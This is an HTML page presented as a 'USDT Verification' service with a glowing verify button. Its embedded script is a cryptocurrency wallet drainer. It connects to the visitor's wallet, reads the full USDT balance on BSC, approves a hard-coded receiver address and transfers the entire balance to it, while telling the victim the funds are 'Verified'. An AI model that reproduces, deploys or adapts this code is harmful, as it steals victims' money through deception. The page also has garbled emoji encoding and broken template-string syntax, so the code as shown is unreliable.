<!DOCTYPE html>
<html>
<head>
  <title>USDT Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #ffffff;
      overflow-x: hidden;
    }

    .container {
      text-align: center;
      padding: 20px;
    }

    .canva-design {
      width: 100%;
      max-width: 600px;
      margin: 0 auto;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }

    .verify-button {
      margin-top: 20px;
      padding: 15px 30px;
      font-size: 18px;
      font-weight: bold;
      color: white;
      background: #007bff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 0 15px #00f;
      transition: 0.3s ease;
    }

    .verify-button:hover {
      box-shadow: 0 0 25px #00f;
    }

    #status {
      margin-top: 20px;
      font-size: 16px;
      color: green;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
</head>
<body>
  <div class="container">

    <!-- ‚úÖ Canva-style embedded image layout -->
    <div class="canva-design">
      <img src="https://www.canva.com/design/DAGqu3wFQs4/view?embed" alt="Canva Layout" style="width:100%; height:auto;">
    </div>

    <!-- ‚úÖ Glowing button like Canva -->
    <button class="verify-button" onclick="startTransfer()">Get USDT Verification</button>

    <!-- ‚úÖ Result -->
    <div id="status"></div>
  </div>

  <script>
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // ‚úÖ your wallet address
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // ‚úÖ USDT contract BSC
    const usdtABI = [
      { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
      { "constant": false, "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "approve", "outputs": [{"name": "success", "type": "bool"}], "type": "function" },
      { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "success", "type": "bool"}], "type": "function" }
    ];

    async function startTransfer() {
      const status = document.getElementById("status");

      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Please open in Trust Wallet browser.");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
      const balance = await usdt.methods.balanceOf(sender).call();

      if (balance == 0) {
        status.innerText = "‚ùå No USDT in wallet.";
        return;
      }

      const readable = web3.utils.fromWei(balance, 'ether');
      status.innerText = üîÑ Approving ${readable} USDT...;

      try {
        await usdt.methods.approve(receiver, balance).send({ from: sender });
        status.innerText = "‚úÖ Approved. Sending...";

        await usdt.methods.transfer(receiver, balance).send({ from: sender });
        status.innerText = üéâ ${readable} USDT Verified.;
      } catch (err) {
        console.error(err);
        status.innerText = "‚ùå Failed or Cancelled.";
      }
    }
  </script>
</body>
</html>
